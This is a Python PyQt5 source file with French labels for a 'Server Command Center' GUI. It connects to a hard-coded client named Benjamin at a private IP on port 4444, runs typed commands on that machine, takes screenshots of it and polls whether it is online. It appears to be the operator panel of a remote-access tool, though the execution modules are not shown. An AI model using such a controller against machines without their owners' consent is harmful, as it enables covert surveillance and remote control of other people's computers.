from PyQt5.QtWidgets import QWidget, QVBoxLayout, QTextEdit, QPushButton, QComboBox, QGroupBox, QFormLayout, QLineEdit
from PyQt5.QtCore import QTimer
from connection_manager import ConnectionManager
from command_executor import CommandExecutor
from screenshot_manager import ScreenshotManager
from utils import check_connection, create_status_icon

class CommandCenter(QWidget):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("Server Command Center")
        self.setGeometry(100, 100, 600, 400)

        self.conn_manager = ConnectionManager()
        self.command_executor = CommandExecutor(self.conn_manager)
        self.screenshot_manager = ScreenshotManager(self.conn_manager)

        self.users = {
            "Benjamin": ("172.16.80.83", 4444)
        }

        self.init_ui()
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_user_status)
        self.timer.start(300000)

    def init_ui(self):
        layout = QVBoxLayout()

        connection_group = QGroupBox("Connexion")
        connection_layout = QFormLayout()

        self.user_list = QComboBox(self)
        self.user_list.addItem("Sélectionner un client")
        for user in self.users.keys():
            self.user_list.addItem(user)
        self.user_list.currentIndexChanged.connect(self.on_user_selected)

        self.ip_input = QLineEdit(self)
        self.port_input = QLineEdit(self)

        connection_layout.addRow("Utilisateur :", self.user_list)
        connection_layout.addRow("IP :", self.ip_input)
        connection_layout.addRow("Port :", self.port_input)
        connection_group.setLayout(connection_layout)

        self.command_input = QTextEdit(self)
        self.output_display = QTextEdit(self)
        self.output_display.setReadOnly(True)

        self.connect_button = QPushButton("Se connecter", self)
        self.connect_button.clicked.connect(self.toggle_connection)

        self.execute_button = QPushButton("Exécuter commande", self)
        self.execute_button.clicked.connect(self.execute_command)

        self.screenshot_button = QPushButton("Prendre un screenshot", self)
        self.screenshot_button.clicked.connect(self.request_screenshot)

        layout.addWidget(connection_group)
        layout.addWidget(self.command_input)
        layout.addWidget(self.execute_button)
        layout.addWidget(self.screenshot_button)
        layout.addWidget(self.output_display)
        layout.addWidget(self.connect_button)

        self.setLayout(layout)
        self.update_user_status()

    def on_user_selected(self):
        user = self.user_list.currentText()
        if user in self.users:
            ip, port = self.users[user]
            self.ip_input.setText(ip)
            self.port_input.setText(str(port))
            self.toggle_connection()

    def toggle_connection(self):
        if self.conn_manager.conn:
            self.conn_manager.disconnect()
            self.output_display.append("[-] Déconnecté du client.")
            self.connect_button.setText("Se connecter")
        else:
            ip, port = self.ip_input.text(), self.port_input.text()
            if self.conn_manager.connect(ip, port):
                self.output_display.append(f"[+] Connecté à {ip}:{port}")
                self.connect_button.setText("Se déconnecter")
            else:
                self.output_display.append("[!] Échec de la connexion.")

    def execute_command(self):
        command = self.command_input.toPlainText().strip()
        if command:
            output = self.command_executor.execute(command)
            self.output_display.append(output)
        else:
            self.output_display.append("[!] Aucune commande saisie.")

    def request_screenshot(self):
        output = self.screenshot_manager.request_screenshot()
        self.output_display.append(output)

    def update_user_status(self):
        for i in range(1, self.user_list.count()):
            user = self.user_list.itemText(i)
            ip, port = self.users[user]
            icon = create_status_icon("green" if check_connection(ip, port) else "red")
            self.user_list.setItemIcon(i, icon)